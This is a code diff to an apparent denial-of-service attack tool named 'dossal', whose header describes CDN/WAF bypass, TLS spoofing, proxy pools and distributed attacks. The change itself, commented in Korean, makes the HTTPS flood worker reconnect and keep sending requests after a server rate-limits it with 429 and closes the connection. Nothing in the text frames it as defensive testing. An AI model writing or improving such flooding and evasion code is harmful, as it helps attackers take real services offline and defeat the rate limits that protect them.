@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dossal v13.1 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
+dossal v13.2 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
 v5.0: proxy pool, TLS spoof, origin discovery
 v5.2: adaptive attack (RPS auto-adjust based on response time)
 v6.0: distributed attack (coordinator + worker, UDP control channel)
@@ -878,7 +878,7 @@ from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 from h2.exceptions import FlowControlError  # v13.1: gRPC flow control 대응
 
-VERSION = "13.1"
+VERSION = "13.2"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -1233,6 +1233,7 @@ async def https_worker(name, url, stats, duration, stop, payload_size=0):
     _h, _ = _spoofed_http_headers(host, req_path, _BROWSER[0])
     req = (f"GET {req_path} HTTP/1.1\r\n" + "\r\n".join(_h) + "\r\n\r\n")
     req_bytes = req.encode()
+    # v13.2: 429/Connection-close 시 재연결
     while not stop.is_set():
         if _JITTER[0] > 0:
             import random as _rj
@@ -1245,7 +1246,14 @@ async def https_worker(name, url, stats, duration, stop, payload_size=0):
                 return await _read_http_response(reader)
             resp = await asyncio.wait_for(_write_read(), timeout=10.0)
             if not resp:
-                stats.errors += 1
+                # v13.2: 비어있는 응답 = 서버가 연결을 닫음 (429 후 close)
+                # → 새 연결으로 재연결 (에러로 세지 않음)
+                try:
+                    writer.close()
+                    await writer.wait_closed()
+                except Exception:
+                    pass
+                reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
                 continue
             stats.requests += 1
             stats.bytes += len(resp)
